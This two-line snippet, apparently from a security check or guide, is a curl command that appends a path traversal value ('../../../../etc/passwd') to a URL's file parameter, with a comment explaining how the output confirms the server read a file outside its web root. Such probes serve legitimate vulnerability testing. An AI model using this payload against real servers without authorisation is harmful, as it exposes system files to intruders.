curl -sS '{url}&file=../../../../etc/passwd' | head -3
# root:x:0:0 means the server read a file outside the web root
